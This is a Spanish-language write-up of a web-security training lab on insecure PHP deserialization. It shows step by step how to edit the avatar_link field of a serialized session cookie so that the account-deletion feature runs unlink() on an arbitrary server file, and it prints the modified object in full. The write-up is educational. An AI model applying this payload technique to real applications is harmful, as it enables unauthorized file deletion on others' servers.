# 3. Explotación vía Funciones de la Aplicación

## 🧬 Explotación vía funciones de la aplicación

### 📄 Descripción del laboratorio

Este laboratorio utiliza **serialización de objetos PHP para gestionar la sesión del usuario**.\
La cookie de sesión contiene un objeto serializado que el backend deserializa en cada petición.

Una funcionalidad legítima de la aplicación utiliza uno de los atributos de ese objeto para ejecutar una operación sobre el sistema de archivos.

Manipulando ese atributo dentro del objeto serializado es posible provocar que el servidor elimine un archivo arbitrario.

🎯 **Objetivo del laboratorio:**

* Modificar el objeto serializado de la sesión
* Conseguir que el servidor elimine el archivo:

```
/home/carlos/morale.txt
```

Credenciales disponibles:

```
wiener : peter
gregg : rosebud
```

***

### 📚 Teoría

Este laboratorio ilustra un caso de **Insecure Deserialization explotado a través de funciones legítimas de la aplicación**.

Aquí no se busca:

* Escalada directa de privilegios
* Bypass de autenticación
* Manipulación de flags de administrador

En cambio, el ataque consiste en **abusar de la lógica interna de la aplicación**.

#### 📌 Flujo interno de la aplicación

Cuando el usuario inicia sesión:

```
1. El backend crea un objeto User
2. El objeto se serializa con serialize()
3. El resultado se codifica (Base64)
4. El valor se guarda en una cookie
```

El objeto contiene propiedades como:

```
username
access_token
avatar_link
```

En cada petición el servidor:

```
lee la cookie
la decodifica
ejecuta unserialize()
confía en los valores del objeto
```

#### 📌 Uso peligroso del atributo avatar\_link

Cuando el usuario ejecuta la acción **Delete my account**, el backend realiza dos operaciones:

```
1. Eliminar la cuenta del usuario
2. Borrar el archivo asociado al avatar
```

Internamente ocurre algo equivalente a:

```
unlink($user->avatar_link);
```

Normalmente el valor sería algo como:

```
users/wiener/avatar
```

Sin embargo, el servidor:

```
no valida la ruta
no sanitiza el valor
confía en el objeto deserializado
```

Esto permite modificar el valor de `avatar_link` para apuntar a cualquier archivo del sistema.

Este patrón se conoce como:

**Application gadget abuse**

***

### 📝 Práctica

#### 1️⃣ Iniciar sesión y capturar la cookie

Iniciamos sesión con:

```
wiener : peter
```

Accedemos a `/my-account` y observamos la cookie de sesión en Burp.

Ejemplo:

```
session=eyJ...
```

***

#### 2️⃣ Decodificar el objeto serializado

Enviamos el valor de la cookie a **Burp Decoder**.

Proceso habitual:

```
URL decode
Base64 decode
```

El resultado es el objeto PHP serializado:

```
O:4:"User":3:{
  s:8:"username";s:6:"wiener";
  s:12:"access_token";s:32:"llv0hajswkif8izb7ynozcd0xhipkjuk";
  s:11:"avatar_link";s:19:"users/wiener/avatar";
}
```

El atributo vulnerable es:

```
avatar_link
```

***

#### 3️⃣ Modificar el atributo avatar\_link

El archivo objetivo es:

```
/home/carlos/morale.txt
```

Contamos la longitud del string:

```
/home/carlos/morale.txt
```

Tiene **23 caracteres**.

Sustituimos el valor original:

```
s:19:"users/wiener/avatar";
```

por:

```
s:23:"/home/carlos/morale.txt";
```

El objeto final queda:

```
O:4:"User":3:{
  s:8:"username";s:6:"wiener";
  s:12:"access_token";s:32:"llv0hajswkif8izb7ynozcd0xhipkjuk";
  s:11:"avatar_link";s:23:"/home/carlos/morale.txt";
}
```

No se modifica ninguna otra parte del objeto.

***

#### 4️⃣ Recodificar la cookie

Codificamos nuevamente el objeto:

```
Base64 encode
URL encode (si aplica)
```

En Burp esto puede hacerse desde el **Inspector**, aplicando los cambios automáticamente.

La cookie queda actualizada en la petición.

<figure><img src="../../../.gitbook/assets/image (1100).png" alt=""><figcaption></figcaption></figure>

***

#### 5️⃣ Ejecutar la acción vulnerable

Accedemos a:

```
/my-account
```

y pulsamos:

```
Delete my account
```

En el backend ocurre lo siguiente:

```
1. El servidor deserializa la cookie manipulada
2. Procesa la eliminación del usuario
3. Ejecuta unlink("/home/carlos/morale.txt")
```

El archivo objetivo es eliminado.

<figure><img src="../../../.gitbook/assets/image (1101).png" alt=""><figcaption></figcaption></figure>

***

#### 6️⃣ Resultado

Se consigue:

* Manipular un objeto PHP serializado
* Abusar de una función legítima de la aplicación
* Forzar la eliminación del archivo:

```
/home/carlos/morale.txt
```

✅ **Laboratorio resuelto.**
